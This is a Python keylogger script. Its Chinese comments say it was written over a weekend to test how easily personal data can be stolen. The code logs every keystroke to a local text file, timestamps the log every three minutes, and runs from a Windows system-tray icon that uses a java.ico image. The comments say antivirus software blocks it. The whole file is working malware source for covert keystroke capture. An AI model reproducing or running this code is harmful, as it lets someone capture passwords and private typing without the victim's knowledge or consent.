#2023-11-25 & 26 製作
#有一天睡前想到，個資是不是一個簡單的程式就能輕易竊取?
#周末寫了這個，執行後開始記錄使用者的鍵盤輸入
#每3分鐘輸出當時電腦上的時間
#每次輸入時都會馬上紀錄，使用Append，因此無法自動處理Backspace/del鍵
#最後還是需要人來解讀(b)(del)
#程式會在 windows 10 的狀態列中
#狀態列icon右鍵點退出 + termial按enter後才會停止
#(windows防火牆跟任何防毒軟體都會擋下來，只能在vscode/pycharm 等IDE中執行才可)

from pynput import keyboard as kb
from threading import Timer
import time
import pystray
import PIL.Image
import sys

image = PIL.Image.open("2-keylogger\java.ico")
file = open("2-keylogger\loggings.txt", "a")

class RepeatTimer(Timer):
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)

def current_time():
    return time.ctime(time.time())

def ptime():
        print ("\n" + current_time() + ": \n")
        file.write("\n" + current_time() + ": \n")


def Pressed(key):
    skey = str(key)
    skey = skey.replace("'", "")

    if (str(key)=="Key.space"):
        print(" ", end="")
        file.write(" ")
    elif(str(key)=="Key.enter"):
        print("\n", end="")
        file.write("\n")
    elif(str(key)=="Key.backspace"):
        print("(b)", end="")
        file.write("(b)")
    elif(str(key)=="Key.ctrl_l"):
        print("(ctr)", end="")
        file.write("(ctr)")
    elif(str(key)=="Key.shift"):
        print("", end="")
    elif(str(key)=="Key.delete"):
        print("(del)", end="")
    elif(len(skey)>1):
        print("", end="")

    else:
        print (skey, end="")
        file.write(skey)

listener =  kb.Listener(on_press=Pressed)

def butt():
    print("\nexiting...")
    listener.stop()
    timer.cancel()
    icon.stop()

    
icon = pystray.Icon("Coomer", image, menu=pystray.Menu(
    pystray.MenuItem("Exit", butt)
))



if __name__ == "__main__":
    timer = RepeatTimer(180, ptime)
    ptime()
    timer.start()
    listener.start()
    icon.run()
    input()
    sys.exit()

    
    
    
